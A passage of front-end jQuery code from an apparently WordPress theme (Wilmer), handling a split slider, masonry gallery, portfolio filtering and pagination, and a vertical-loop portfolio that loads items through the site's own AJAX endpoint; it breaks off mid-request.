					mkdf.body.addClass('mkdf-vss-initialized');
					
					var contactForm7 = $('div.wpcf7 > form');
					if (contactForm7.length) {
						contactForm7.each(function(){
							var thisForm = $(this);
							
							thisForm.find('.wpcf7-submit').off().on('click', function(e){
								e.preventDefault();
								wpcf7.submit(thisForm);
							});
						});
					}
					
					//prepare html for smaller screens - start //
					var verticalSplitSliderResponsive = $('<div class="mkdf-vss-responsive"></div>'),
						leftSide = slider.find('.mkdf-vss-ms-left > div'),
						rightSide = slider.find('.mkdf-vss-ms-right > div');
					
					slider.after(verticalSplitSliderResponsive);
					
					for (var i = 0; i < leftSide.length; i++) {
						verticalSplitSliderResponsive.append($(leftSide[i]).clone(true));
						verticalSplitSliderResponsive.append($(rightSide[leftSide.length - 1 - i]).clone(true));
					}
					
					//prepare google maps clones
					var googleMapHolder = $('.mkdf-vss-responsive .mkdf-google-map');
					if (googleMapHolder.length) {
						googleMapHolder.each(function () {
							var map = $(this);
							map.empty();
							var num = Math.floor((Math.random() * 100000) + 1);
							map.attr('id', 'mkdf-map-' + num);
							map.data('unique-id', num);
						});
					}
					
					if (typeof mkdf.modules.animationHolder.mkdfInitAnimationHolder === "function") {
						mkdf.modules.animationHolder.mkdfInitAnimationHolder();
					}
					
					if (typeof mkdf.modules.button.mkdfButton === "function") {
						mkdf.modules.button.mkdfButton().init();
					}
					
					if (typeof mkdf.modules.elementsHolder.mkdfInitElementsHolderResponsiveStyle === "function") {
						mkdf.modules.elementsHolder.mkdfInitElementsHolderResponsiveStyle();
					}
					
					if (typeof mkdf.modules.googleMap.mkdfShowGoogleMap === "function") {
						mkdf.modules.googleMap.mkdfShowGoogleMap();
					}
					
					if (typeof mkdf.modules.icon.mkdfIcon === "function") {
						mkdf.modules.icon.mkdfIcon().init();
					}
					
					if (progressBarFlag && typeof mkdf.modules.progressBar.mkdfInitProgressBars === "function" && ($('.mkdf-vss-ms-left .mkdf-vss-ms-section.active').find('.mkdf-progress-bar').length || $('.mkdf-vss-ms-right .mkdf-vss-ms-section.active').find('.mkdf-progress-bar').length)){
						mkdf.modules.progressBar.mkdfInitProgressBars();
						progressBarFlag = false;
					}
				},
				onLeave: function (index, nextIndex) {
					if (progressBarFlag && typeof mkdf.modules.progressBar.mkdfInitProgressBars === "function" && ($('.mkdf-vss-ms-left .mkdf-vss-ms-section.active').find('.mkdf-progress-bar').length || $('.mkdf-vss-ms-right .mkdf-vss-ms-section.active').find('.mkdf-progress-bar').length)){
						setTimeout(function(){
							mkdf.modules.progressBar.mkdfInitProgressBars();
						},700); // scrolling speed is 700

						progressBarFlag = false;
					}

					mkdfIntiScrollAnimation(slider, nextIndex);
					mkdfCheckVerticalSplitSectionsForHeaderStyle($($('.mkdf-vss-ms-left .mkdf-vss-ms-section')[nextIndex - 1]).data('header-style'), defaultHeaderStyle);
				}
			});
			
			if (mkdf.windowWidth <= 1024) {
				$.fn.multiscroll.destroy();
			} else {
				$.fn.multiscroll.build();
			}
			
			$(window).resize(function () {
				if (mkdf.windowWidth <= 1024) {
					$.fn.multiscroll.destroy();
				} else {
					$.fn.multiscroll.build();
				}
			});
		}
	}
	
	function mkdfIntiScrollAnimation(slider, nextIndex) {
		
		if (slider.hasClass('mkdf-vss-scrolling-animation')) {
			
			if (nextIndex > 1 && !slider.hasClass('mkdf-vss-scrolled')) {
				slider.addClass('mkdf-vss-scrolled');
			} else if (nextIndex === 1 && slider.hasClass('mkdf-vss-scrolled')) {
				slider.removeClass('mkdf-vss-scrolled');
			}
		}
	}
	
	/*
	 **	Check slides on load and slide change for header style changing
	 */
	function mkdfCheckVerticalSplitSectionsForHeaderStyle(section_header_style, default_header_style) {
		if (section_header_style !== undefined && section_header_style !== '') {
			mkdf.body.removeClass('mkdf-light-header mkdf-dark-header').addClass('mkdf-' + section_header_style + '-header');
		} else if (default_header_style !== '') {
			mkdf.body.removeClass('mkdf-light-header mkdf-dark-header').addClass('mkdf-' + default_header_style + '-header');
		} else {
			mkdf.body.removeClass('mkdf-light-header mkdf-dark-header');
		}
	}
	
})(jQuery);
(function ($) {
	'use strict';
	
	var videoButton = {};
	mkdf.modules.videoButton = videoButton;


    videoButton.mkdfOnWindowLoad = mkdfOnWindowLoad;
	
	$(window).on('load', mkdfOnWindowLoad());
	
	/**
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnWindowLoad() {
        mkdfElementorVideoButton();
	}


    /**
     * Elementor Team Carousel
     */
    function mkdfElementorVideoButton() {
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction('frontend/element_ready/mkdf_video_button.default', function () {
                mkdf.modules.common.mkdfPrettyPhoto();
            });
        });
    }
	
})(jQuery);
(function($) {
	'use strict';
	
	var workflow = {};
	mkdf.modules.workflow = workflow;

    workflow.mkdfWorkflow = mkdfWorkflow;


    workflow.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/**
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
        mkdfWorkflow();
	}

    /**
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementorWorkflow();
    }

    /**
     * Elementor
     */
    function mkdfElementorWorkflow(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_workflow.default', function() {
                mkdfWorkflow();
            } );
        });
    }

    function mkdfWorkflow() {
        var workflowShortcodes = $('.mkdf-workflow');
        if (workflowShortcodes.length) {
            workflowShortcodes.each(function () {
                var workflowShortcode = $(this);
                if (workflowShortcode.hasClass('mkdf-workflow-animate')) {
                    var workflowItems = workflowShortcode.find('.mkdf-workflow-item');

                    workflowShortcode.appear(function () {
                        workflowShortcode.addClass('mkdf-appeared');
                        setTimeout(function () {
                            workflowItems.each(function (i) {
                                var workflowItem = $(this);
                                setTimeout(function () {
                                    workflowItem.addClass('mkdf-appeared');
                                }, 350 * i);
                            });
                        }, 350);
                    }, {accX: 0, accY: mkdfGlobalVars.vars.mkdfElementAppearAmount});

                }
            });
        }
    }
	
})(jQuery);
(function($) {
    'use strict';
	
	var masonryGalleryList = {};
	mkdf.modules.masonryGalleryList = masonryGalleryList;

    masonryGalleryList.mkdfInitMasonryGallery = mkdfInitMasonryGallery;

    masonryGalleryList.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitMasonryGallery().init();
	}

    /**
     All functions to be called on $(document).ready() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementorMasonryGallery();
    }


    /**
     * Elementor
     */
    function mkdfElementorMasonryGallery(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_masonry_gallery.default', function() {
                mkdfInitMasonryGallery().init();
            } );
        });
    }

	/**
	 * Masonry gallery, init masonry and resize pictures in grid
	 */
	function mkdfInitMasonryGallery() {
		var holder = $('.mkdf-masonry-gallery-holder');
		
		var initMasonryGallery = function (thisHolder, size) {
			thisHolder.waitForImages(function () {
				var masonry = thisHolder.children();
				
				masonry.isotope({
					layoutMode: 'packery',
					itemSelector: '.mkdf-mg-item',
					percentPosition: true,
					packery: {
						gutter: '.mkdf-mg-grid-gutter',
						columnWidth: '.mkdf-mg-grid-sizer'
					}
				});
				
				mkdf.modules.common.setFixedImageProportionSize(thisHolder, thisHolder.find('.mkdf-mg-item'), size, true);
				
				setTimeout(function () {
					mkdf.modules.common.mkdfInitParallax();
				}, 600);
				
				masonry.isotope( 'layout').css('opacity', '1');
			});
		};
		
		var reInitMasonryGallery = function (thisHolder, size) {
			mkdf.modules.common.setFixedImageProportionSize(thisHolder, thisHolder.find('.mkdf-mg-item'), size, true);
			
			thisHolder.children().isotope('reloadItems');
		};
		
		return {
			init: function () {
				if (holder.length) {
					holder.each(function () {
						var thisHolder = $(this),
							size = thisHolder.find('.mkdf-mg-grid-sizer').outerWidth();
						
						initMasonryGallery(thisHolder, size);
						
						$(window).resize(function () {
							reInitMasonryGallery(thisHolder, size);
						});
					});
				}
			}
		};
	}

})(jQuery);
(function($) {
    'use strict';

    var portfolioFullheightSlider = {};
    mkdf.modules.portfolioFullheightSlider = portfolioFullheightSlider;

    portfolioFullheightSlider.mkdfOnDocumentReady = mkdfOnDocumentReady;
    portfolioFullheightSlider.mkdfOnWindowLoad = mkdfOnWindowLoad;
    portfolioFullheightSlider.mkdfOnWindowScroll = mkdfOnWindowScroll;

    $(document).ready(mkdfOnDocumentReady);
    $(window).on('load', mkdfOnWindowLoad());
    $(window).scroll(mkdfOnWindowScroll);
    

    /*
     All functions to be called on $(document).ready() should be in this function
     */
    function mkdfOnDocumentReady() {

    }

    /*
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfportfolioFullheightSliderInitMouseWheel();
        mkdfElementorPortfolioFullheightSlider();
    }

    /*
     All functions to be called on $(window).scroll() should be in this function
     */
    function mkdfOnWindowScroll() {

    }

    /**
     * Elementor
     */
    function mkdfElementorPortfolioFullheightSlider(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_portfolio_fullheight_slider.default', function() {
                mkdf.modules.common.mkdfOwlSlider();
                mkdf.modules.common.mkdfPrettyPhoto();
                mkdfportfolioFullheightSliderInitMouseWheel();
            } );
        });
    }

    function mkdfportfolioFullheightSliderInitMouseWheel(){

        var portfolioFullheightSlider = $('.mkdf-portfolio-fullheight-slider-holder');

        if(portfolioFullheightSlider.length && portfolioFullheightSlider.hasClass('mkdf-slide-on-mouse-scroll')){
            portfolioFullheightSlider.each(function(){
                var sliders = $(this).find('.mkdf-owl-slider');

                if (sliders.length) {
                    sliders.each(function() {

                        var slider = $(this);

                        slider.on('mousewheel', '.owl-stage', function (e) {
                            if (!slider.data('mkdf-active')) {
                                var curr = $(this);
                                if (e.deltaY < 0) {
                                    curr.trigger('next.owl');
                                } else {
                                    curr.trigger('prev.owl');
                                }
                                e.preventDefault();
                            }
                        });

                    })
                }
            })
        }
    }

})(jQuery);
(function($) {
    'use strict';

    var portfolioList = {};
    mkdf.modules.portfolioList = portfolioList;

    portfolioList.mkdfOnWindowLoad = mkdfOnWindowLoad;
    portfolioList.mkdfOnWindowScroll = mkdfOnWindowScroll;

    $(window).on('load', mkdfOnWindowLoad());
    $(window).scroll(mkdfOnWindowScroll);

    /*
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfInitPortfolioFilter();
        mkdfInitPortfolioListAnimation();
	    mkdfInitPortfolioPagination().init();
		mkdfElementorPortfolioList();
    }

    /*
     All functions to be called on $(window).scroll() should be in this function
     */
    function mkdfOnWindowScroll() {
	    mkdfInitPortfolioPagination().scroll();
    }

	/**
	 * Elementor
	 */
	function mkdfElementorPortfolioList(){
		$(window).on('elementor/frontend/init', function () {
			elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_portfolio_list.default', function() {
				mkdf.modules.common.mkdfInitGridMasonryListLayout();
				mkdfInitPortfolioFilter();
				mkdfInitPortfolioListAnimation();
				mkdfInitPortfolioPagination().init();
			} );
		});
	}

    /**
     * Initializes portfolio list article animation
     */
    function mkdfInitPortfolioListAnimation(){
        var portList = $('.mkdf-portfolio-list-holder.mkdf-pl-has-animation');

        if(portList.length){
            portList.each(function(){
                var thisPortList = $(this).children('.mkdf-pl-inner');

                thisPortList.children('article').each(function(l) {
                    var thisArticle = $(this);

                    thisArticle.appear(function() {
                        thisArticle.addClass('mkdf-item-show');

                        setTimeout(function(){
                            thisArticle.addClass('mkdf-item-shown');
                        }, 1000);
                    },{accX: 0, accY: 0});
                });
            });
        }
    }

    /**
     * Initializes portfolio masonry filter
     */
    function mkdfInitPortfolioFilter(){
        var filterHolder = $('.mkdf-portfolio-list-holder .mkdf-pl-filter-holder');

        if(filterHolder.length){
            filterHolder.each(function(){
                var thisFilterHolder = $(this),
                    thisPortListHolder = thisFilterHolder.closest('.mkdf-portfolio-list-holder'),
                    thisPortListInner = thisPortListHolder.find('.mkdf-pl-inner'),
                    portListHasLoadMore = thisPortListHolder.hasClass('mkdf-pl-pag-load-more') ? true : false;

                thisFilterHolder.find('.mkdf-pl-filter:first').addClass('mkdf-pl-current');
	            
	            if(thisPortListHolder.hasClass('mkdf-pl-gallery')) {
		            thisPortListInner.isotope();
	            }

                thisFilterHolder.find('.mkdf-pl-filter').on('click', function(){
                    var thisFilter = $(this),
                        filterValue = thisFilter.attr('data-filter'),
                        filterClassName = filterValue.length ? filterValue.substring(1) : '',
	                    portListHasArticles = thisPortListInner.children().hasClass(filterClassName) ? true : false;

                    thisFilter.parent().children('.mkdf-pl-filter').removeClass('mkdf-pl-current');
                    thisFilter.addClass('mkdf-pl-current');
	
	                if(portListHasLoadMore && !portListHasArticles && filterValue.length) {
		                mkdfInitLoadMoreItemsPortfolioFilter(thisPortListHolder, filterValue, filterClassName);
	                } else {
		                filterValue = filterValue.length === 0 ? '*' : filterValue;
                   
                        thisFilterHolder.parent().children('.mkdf-pl-inner').isotope({ filter: filterValue });
	                    mkdf.modules.common.mkdfInitParallax();
                    }
                });
            });
        }
    }

    /**
     * Initializes load more items if portfolio masonry filter item is empty
     */
    function mkdfInitLoadMoreItemsPortfolioFilter($portfolioList, $filterValue, $filterClassName) {
        var thisPortList = $portfolioList,
            thisPortListInner = thisPortList.find('.mkdf-pl-inner'),
            filterValue = $filterValue,
            filterClassName = $filterClassName,
            maxNumPages = 0;

        if (typeof thisPortList.data('max-num-pages') !== 'undefined' && thisPortList.data('max-num-pages') !== false) {
            maxNumPages = thisPortList.data('max-num-pages');
        }

        var	loadMoreDatta = mkdf.modules.common.getLoadMoreData(thisPortList),
            nextPage = loadMoreDatta.nextPage,
	        ajaxData = mkdf.modules.common.setLoadMoreAjaxData(loadMoreDatta, 'wilmer_core_portfolio_ajax_load_more'),
            loadingItem = thisPortList.find('.mkdf-pl-loading');

        if(nextPage <= maxNumPages) {
            loadingItem.addClass('mkdf-showing mkdf-filter-trigger');
            thisPortListInner.css('opacity', '0');

            $.ajax({
                type: 'POST',
                data: ajaxData,
                url: mkdfGlobalVars.vars.mkdfAjaxUrl,
                success: function (data) {
                    nextPage++;
                    thisPortList.data('next-page', nextPage);
                    var response = $.parseJSON(data),
                        responseHtml = response.html;

                    thisPortList.waitForImages(function () {
                        thisPortListInner.append(responseHtml).isotope('reloadItems').isotope({sortBy: 'original-order'});
                        var portListHasArticles = !!thisPortListInner.children().hasClass(filterClassName);

                        if(portListHasArticles) {
                            setTimeout(function() {
	                            mkdf.modules.common.setFixedImageProportionSize(thisPortList, thisPortListInner.find('article'), thisPortListInner.find('.mkdf-masonry-grid-sizer').width(), true);
                                thisPortListInner.isotope('layout').isotope({filter: filterValue});
                                loadingItem.removeClass('mkdf-showing mkdf-filter-trigger');

                                setTimeout(function() {
                                    thisPortListInner.css('opacity', '1');
                                    mkdfInitPortfolioListAnimation();
	                                mkdf.modules.common.mkdfInitParallax();
                                }, 150);
                            }, 400);
                        } else {
                            loadingItem.removeClass('mkdf-showing mkdf-filter-trigger');
                            mkdfInitLoadMoreItemsPortfolioFilter(thisPortList, filterValue, filterClassName);
                        }
                    });
                }
            });
        }
    }
	
	/**
	 * Initializes portfolio pagination functions
	 */
	function mkdfInitPortfolioPagination(){
		var portList = $('.mkdf-portfolio-list-holder');
		
		var initStandardPagination = function(thisPortList) {
			var standardLink = thisPortList.find('.mkdf-pl-standard-pagination li');
			
			if(standardLink.length) {
				standardLink.each(function(){
					var thisLink = $(this).children('a'),
						pagedLink = 1;
					
					thisLink.on('click', function(e) {
						e.preventDefault();
						e.stopPropagation();
						
						if (typeof thisLink.data('paged') !== 'undefined' && thisLink.data('paged') !== false) {
							pagedLink = thisLink.data('paged');
						}
						
						initMainPagFunctionality(thisPortList, pagedLink);
					});
				});
			}
		};
		
		var initLoadMorePagination = function(thisPortList) {
			var loadMoreButton = thisPortList.find('.mkdf-pl-load-more a');
			
			loadMoreButton.on('click', function(e) {
				e.preventDefault();
				e.stopPropagation();
				
				initMainPagFunctionality(thisPortList);
			});
		};
		
		var initInifiteScrollPagination = function(thisPortList) {
			var portListHeight = thisPortList.outerHeight(),
				portListTopOffest = thisPortList.offset().top,
				portListPosition = portListHeight + portListTopOffest - mkdfGlobalVars.vars.mkdfAddForAdminBar;
			
			if(!thisPortList.hasClass('mkdf-pl-infinite-scroll-started') && mkdf.scroll + mkdf.windowHeight > portListPosition) {
				initMainPagFunctionality(thisPortList);
			}
		};
		
		var initMainPagFunctionality = function(thisPortList, pagedLink) {
			var thisPortListInner = thisPortList.find('.mkdf-pl-inner'),
				nextPage,
				maxNumPages;
			
			if (typeof thisPortList.data('max-num-pages') !== 'undefined' && thisPortList.data('max-num-pages') !== false) {
				maxNumPages = thisPortList.data('max-num-pages');
			}
			
			if(thisPortList.hasClass('mkdf-pl-pag-standard')) {
				thisPortList.data('next-page', pagedLink);
			}
			
			if(thisPortList.hasClass('mkdf-pl-pag-infinite-scroll')) {
				thisPortList.addClass('mkdf-pl-infinite-scroll-started');
			}
			
			var loadMoreDatta = mkdf.modules.common.getLoadMoreData(thisPortList),
				loadingItem = thisPortList.find('.mkdf-pl-loading');
			
			nextPage = loadMoreDatta.nextPage;
			
			if(nextPage <= maxNumPages || maxNumPages === 0){
				if(thisPortList.hasClass('mkdf-pl-pag-standard')) {
					loadingItem.addClass('mkdf-showing mkdf-standard-pag-trigger');
					thisPortList.addClass('mkdf-pl-pag-standard-animate');
				} else {
					loadingItem.addClass('mkdf-showing');
				}
				
				var ajaxData = mkdf.modules.common.setLoadMoreAjaxData(loadMoreDatta, 'wilmer_core_portfolio_ajax_load_more');
				
				$.ajax({
					type: 'POST',
					data: ajaxData,
					url: mkdfGlobalVars.vars.mkdfAjaxUrl,
					success: function (data) {
						if(!thisPortList.hasClass('mkdf-pl-pag-standard')) {
							nextPage++;
						}
						
						thisPortList.data('next-page', nextPage);
						
						var response = $.parseJSON(data),
							responseHtml =  response.html;
						
						if(thisPortList.hasClass('mkdf-pl-pag-standard')) {
							mkdfInitStandardPaginationLinkChanges(thisPortList, maxNumPages, nextPage);
							
							thisPortList.waitForImages(function(){
								if(thisPortList.hasClass('mkdf-pl-masonry')){
									mkdfInitHtmlIsotopeNewContent(thisPortList, thisPortListInner, loadingItem, responseHtml);
								} else if (thisPortList.hasClass('mkdf-pl-gallery') && thisPortList.hasClass('mkdf-pl-has-filter')) {
									mkdfInitHtmlIsotopeNewContent(thisPortList, thisPortListInner, loadingItem, responseHtml);
								} else {
									mkdfInitHtmlGalleryNewContent(thisPortList, thisPortListInner, loadingItem, responseHtml);
								}
							});
						} else {
							thisPortList.waitForImages(function(){
								if(thisPortList.hasClass('mkdf-pl-masonry')){
								    if(pagedLink === 1) {
                                        mkdfInitHtmlIsotopeNewContent(thisPortList, thisPortListInner, loadingItem, responseHtml);
                                    } else {
                                        mkdfInitAppendIsotopeNewContent(thisPortList, thisPortListInner, loadingItem, responseHtml);
                                    }
								} else if (thisPortList.hasClass('mkdf-pl-gallery') && thisPortList.hasClass('mkdf-pl-has-filter') && pagedLink !== 1) {
									mkdfInitAppendIsotopeNewContent(thisPortList, thisPortListInner, loadingItem, responseHtml);
								} else {
								    if (pagedLink === 1) {
                                        mkdfInitHtmlGalleryNewContent(thisPortList, thisPortListInner, loadingItem, responseHtml);
                                    } else {
                                        mkdfInitAppendGalleryNewContent(thisPortListInner, loadingItem, responseHtml);
                                    }
								}
							});
						}
						
						if(thisPortList.hasClass('mkdf-pl-infinite-scroll-started')) {
							thisPortList.removeClass('mkdf-pl-infinite-scroll-started');
						}
					}
				});
			}
			
			if(nextPage === maxNumPages){
				thisPortList.find('.mkdf-pl-load-more-holder').hide();
			}
		};
		
		var mkdfInitStandardPaginationLinkChanges = function(thisPortList, maxNumPages, nextPage) {
			var standardPagHolder = thisPortList.find('.mkdf-pl-standard-pagination'),
				standardPagNumericItem = standardPagHolder.find('li.mkdf-pag-number'),
				standardPagPrevItem = standardPagHolder.find('li.mkdf-pag-prev a'),
				standardPagNextItem = standardPagHolder.find('li.mkdf-pag-next a');
			
			standardPagNumericItem.removeClass('mkdf-pag-active');
			standardPagNumericItem.eq(nextPage-1).addClass('mkdf-pag-active');
			
			standardPagPrevItem.data('paged', nextPage-1);
			standardPagNextItem.data('paged', nextPage+1);
			
			if(nextPage > 1) {
				standardPagPrevItem.css({'opacity': '1'});
			} else {
				standardPagPrevItem.css({'opacity': '0'});
			}
			
			if(nextPage === maxNumPages) {
				standardPagNextItem.css({'opacity': '0'});
			} else {
				standardPagNextItem.css({'opacity': '1'});
			}
		};
		
		var mkdfInitHtmlIsotopeNewContent = function(thisPortList, thisPortListInner, loadingItem, responseHtml) {
            thisPortListInner.find('article').remove();
            thisPortListInner.append(responseHtml);
			mkdf.modules.common.setFixedImageProportionSize(thisPortList, thisPortListInner.find('article'), thisPortListInner.find('.mkdf-masonry-grid-sizer').width(), true);
            thisPortListInner.isotope('reloadItems').isotope({sortBy: 'original-order'});
			loadingItem.removeClass('mkdf-showing mkdf-standard-pag-trigger');
			thisPortList.removeClass('mkdf-pl-pag-standard-animate');
			
			setTimeout(function() {
				thisPortListInner.isotope('layout');
				mkdfInitPortfolioListAnimation();
				mkdf.modules.common.mkdfInitParallax();
				mkdf.modules.common.mkdfPrettyPhoto();
			}, 600);
		};
		
		var mkdfInitHtmlGalleryNewContent = function(thisPortList, thisPortListInner, loadingItem, responseHtml) {
			loadingItem.removeClass('mkdf-showing mkdf-standard-pag-trigger');
			thisPortList.removeClass('mkdf-pl-pag-standard-animate');
			thisPortListInner.html(responseHtml);
			mkdfInitPortfolioListAnimation();
			mkdf.modules.common.mkdfInitParallax();
			mkdf.modules.common.mkdfPrettyPhoto();
		};
		
		var mkdfInitAppendIsotopeNewContent = function(thisPortList, thisPortListInner, loadingItem, responseHtml) {
            thisPortListInner.append(responseHtml);
			mkdf.modules.common.setFixedImageProportionSize(thisPortList, thisPortListInner.find('article'), thisPortListInner.find('.mkdf-masonry-grid-sizer').width(), true);
            thisPortListInner.isotope('reloadItems').isotope({sortBy: 'original-order'});
			loadingItem.removeClass('mkdf-showing');
			
			setTimeout(function() {
				thisPortListInner.isotope('layout');
				mkdfInitPortfolioListAnimation();
				mkdf.modules.common.mkdfInitParallax();
				mkdf.modules.common.mkdfPrettyPhoto();
			}, 600);
		};
		
		var mkdfInitAppendGalleryNewContent = function(thisPortListInner, loadingItem, responseHtml) {
			loadingItem.removeClass('mkdf-showing');
			thisPortListInner.append(responseHtml);
			mkdfInitPortfolioListAnimation();
			mkdf.modules.common.mkdfInitParallax();
			mkdf.modules.common.mkdfPrettyPhoto();
		};
		
		return {
			init: function() {
				if(portList.length) {
					portList.each(function() {
						var thisPortList = $(this);
						
						if(thisPortList.hasClass('mkdf-pl-pag-standard')) {
							initStandardPagination(thisPortList);
						}
						
						if(thisPortList.hasClass('mkdf-pl-pag-load-more')) {
							initLoadMorePagination(thisPortList);
						}
						
						if(thisPortList.hasClass('mkdf-pl-pag-infinite-scroll')) {
							initInifiteScrollPagination(thisPortList);
						}
					});
				}
			},
			scroll: function() {
				if(portList.length) {
					portList.each(function() {
						var thisPortList = $(this);
						
						if(thisPortList.hasClass('mkdf-pl-pag-infinite-scroll')) {
							initInifiteScrollPagination(thisPortList);
						}
					});
				}
			},
            getMainPagFunction: function(thisPortList, paged) {
                initMainPagFunctionality(thisPortList, paged);
            }
		};
	}

})(jQuery);
(function($) {
    'use strict';

    var portfolioSlider = {};
    mkdf.modules.portfolioSlider = portfolioSlider;

	portfolioSlider.mkdfOnWindowLoad = mkdfOnWindowLoad;

    $(window).on('load', mkdfOnWindowLoad());


    /*
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
		mkdfElementorPortfolioSlider();
    }

	/**
	 * Elementor
	 */
	function mkdfElementorPortfolioSlider(){
		$(window).on('elementor/frontend/init', function () {
			elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_portfolio_slider.default', function() {
				mkdf.modules.common.mkdfOwlSlider();
				mkdf.modules.common.mkdfPrettyPhoto();
			} );
		});
	}

})(jQuery);
(function($) {
    'use strict';

    var portfolioVerticalLoop = {};
    mkdf.modules.portfolioVerticalLoop = portfolioVerticalLoop;

    portfolioVerticalLoop.mkdfOnDocumentReady = mkdfOnDocumentReady;

    $(document).ready(mkdfOnDocumentReady);
    $(window).on('load', mkdfOnWindowLoad());

    function mkdfOnDocumentReady() {
        mkdfInitPortfolioVerticalLoop();
    }

    /*
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementorPortfolioVerticalLoop();
    }

    /**
     * Elementor
     */
    function mkdfElementorPortfolioVerticalLoop(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_portfolio_vertical_loop.default', function() {
                mkdfInitPortfolioVerticalLoop();
            } );
        });
    }

    function mkdfInitPortfolioVerticalLoop(){
        var portfolioVerticalLoopHolder = $('.mkdf-portfolio-vertical-loop-holder');

        if(portfolioVerticalLoopHolder.length) {
            portfolioVerticalLoopHolder.each(function() {
                var thisPortfolioVerticalLoop = $(this),
                    header = $('.mkdf-page-header'),
                    mobileHeader = $('.mkdf-mobile-header'),
                    headerAddition,
                    normalHeaderAddition,
                    headerHeight = header.outerHeight(),
                    paspartuWidth = mkdf.body.hasClass('mkdf-paspartu-enabled') ? parseInt($('.mkdf-paspartu-enabled .mkdf-wrapper').css('padding-left')) : 0;

                if (mkdf.body.hasClass('mkdf-content-is-behind-header')) {
                    normalHeaderAddition = 0;
                } else {
                    normalHeaderAddition = headerHeight;
                }

                var click = true;

                var container = $('.mkdf-pvl-inner');
                $(mkdf.body).on('click', '.mkdf-pvli-content-holder .mkdf-pvli-content-link', function (e) {
                    e.preventDefault();
                    if (click) {
                        click = false;
                        var thisLink = $(this);

                        //check for mobile header
                        if (mkdf.windowWidth < 1000) {
                            headerAddition = mobileHeader.outerHeight();
                        } else {
                            headerAddition = normalHeaderAddition;
                        }

                        var scrollTop = mkdf.window.scrollTop(),
                            elementOffset = thisLink.closest('article').offset().top,
                            distance = (elementOffset - scrollTop) - headerAddition - paspartuWidth;

                        container.find('article:eq(0)').addClass('fade-out');
                        thisLink.closest('article').addClass('move-up').removeClass('next-item').css('transform', 'translateY(-' + distance + 'px)');
                        setTimeout(function () {
                            mkdf.window.scrollTop(0);
                            container.find('article:eq(0)').remove();
                            thisLink.closest('article').removeAttr('style').removeClass('move-up');
                        }, 450);

                        var loadMoreData = mkdf.modules.common.getLoadMoreData(thisPortfolioVerticalLoop);

                        var ajaxData = mkdf.modules.common.setLoadMoreAjaxData(loadMoreData, 'wilmer_core_portfolio_vertical_loop_ajax_load_more');

                        $.ajax({
                            type: 'POST',
                            data: ajaxData,
                            url: mkdfGlobalVars.vars.mkdfAjaxUrl,
                            success: function (data) {

                                var response = $.parseJSON(data),
                                    responseHtml = response.html,
                                    nextItemId = response.next_item_id;
                                thisPortfolioVerticalLoop.data('next-item-id', nextItemId);

                                var nextItem = $(responseHtml).find('.mkdf-pvl-item-inner').parent().addClass('next-item').fadeIn(400);
                                container.append(nextItem);
                                click = true;
                            }
                        });

                        // load navigation
                        mkdfPortfolioVerticalLoopNavigation(thisPortfolioVerticalLoop);
                    }
                    else {
                        return false;
                    }
                });

                //load next item on page load
                mkdfPortfolioVerticalLoopNextItem(thisPortfolioVerticalLoop, container);

            });
        }
    }

    function mkdfPortfolioVerticalLoopNextItem(portfolioVerticalLoopHolder, container){
        var navHolder = portfolioVerticalLoopHolder.find('.mkdf-pvl-navigation-holder'),
            navigation = navHolder.find('.mkdf-pvl-navigation');

        if (typeof navHolder.data('id') !== 'undefined' && navHolder.data('id') !== false) {
            var navItemId = navHolder.data('id');
        }

        if (typeof navHolder.data('next-item-id') !== 'undefined' && navHolder.data('next-item-id') !== false) {
            var navNextItemId = navHolder.data('next-item-id');
        }


        if (typeof portfolioVerticalLoopHolder.data('id') == 'undefined' || portfolioVerticalLoopHolder.data('id') !== false) {
            portfolioVerticalLoopHolder.data('id', navItemId);
        }

        if (typeof portfolioVerticalLoopHolder.data('next-item-id') == 'undefined' || portfolioVerticalLoopHolder.data('next-item-id') == false) {
            portfolioVerticalLoopHolder.data('next-item-id', navNextItemId);
        }

        var loadMoreInitialData = mkdf.modules.common.getLoadMoreData(portfolioVerticalLoopHolder),
            ajaxInitialData = mkdf.modules.common.setLoadMoreAjaxData(loadMoreInitialData, 'wilmer_core_portfolio_vertical_loop_ajax_load_more');

        $.ajax({
            type: 'POST',
            data: ajaxInitialData,
            url: mkdfGlobalVars.vars.mkdfAjaxUrl,
            success: function (data) {
                var response = $.parseJSON(data),
                    responseHtml = response.html,
                    nextItemId = response.next_item_id;
                portfolioVerticalLoopHolder.data('next-item-id', nextItemId);

                var nextItem = $(responseHtml).find('.mkdf-pvl-item-inner').parent().addClass('next-item').fadeIn(400);
                container.append(nextItem);
            }
        });
    }

    function mkdfPortfolioVerticalLoopNavigation(portfolioVerticalLoopHolder){
        var navHolder = portfolioVerticalLoopHolder.find('.mkdf-pvl-navigation-holder'),
            navigation = navHolder.find('.mkdf-pvl-navigation'),
            loadMoreNavData = mkdf.modules.common.getLoadMoreData(navHolder);

        var ajaxDataNav = mkdf.modules.common.setLoadMoreAjaxData(loadMoreNavData, 'wilmer_core_portfolio_vertical_loop_ajax_load_more_navigation');

        $.ajax({
